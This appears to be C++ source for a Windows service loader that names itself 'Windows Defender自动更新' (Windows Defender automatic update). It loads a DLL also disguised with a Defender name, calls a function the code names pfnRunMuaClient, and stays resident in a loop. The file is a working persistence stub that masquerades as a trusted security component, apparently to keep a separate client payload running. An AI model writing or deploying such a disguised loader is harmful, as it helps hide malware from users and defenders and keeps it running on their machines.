// TestRunMuaClientDll.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

typedef void(*FUNC)();

void ServiceMain(int argc, wchar_t* argv[]);
void WINAPI ServiceCtrlHandle(DWORD dwOperateCode);
BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress);
void MyCode();

WCHAR g_szServiceName[MAX_PATH] = L"Windows Defender自动更新";    // 服务名称 
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = { 0 };


int wmain(int argc, wchar_t* argv[])
{
	// 注册服务入口函数
	SERVICE_TABLE_ENTRY stDispatchTable[] = { { g_szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL } };
	StartServiceCtrlDispatcher(stDispatchTable);

	return 0;
}


// 服务的入口函数
void ServiceMain(int argc, wchar_t* argv[])
{
	g_ServiceStatusHandle = RegisterServiceCtrlHandler(g_szServiceName, ServiceCtrlHandle);

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);

	// 执行我们的代码
	MyCode();

	while (TRUE) {
		Sleep(5000);
	}
}


// 服务的处理回调的函数
void WINAPI ServiceCtrlHandle(DWORD dwOperateCode) {

	switch (dwOperateCode)
	{
	case SERVICE_CONTROL_PAUSE:
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;

	case SERVICE_CONTROL_CONTINUE:
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;

	case SERVICE_CONTROL_STOP:
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;

	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}
}


BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress) {

	SERVICE_STATUS serviceStatus = { 0 };
	BOOL bRet = FALSE;

	RtlZeroMemory(&serviceStatus, sizeof(serviceStatus));
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = dwState;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = dwExitCode;
	serviceStatus.dwWaitHint = 3000;

	bRet = SetServiceStatus(g_ServiceStatusHandle, &serviceStatus);
	return bRet;
}


void MyCode() {
	HINSTANCE  hDll = LoadLibrary(L"WindowsDefenderAutoUpdate.dll");
	FUNC pfnRunMuaClient = (FUNC)GetProcAddress(hDll, "WindowsDefenderAutoUpdate");
	pfnRunMuaClient();
}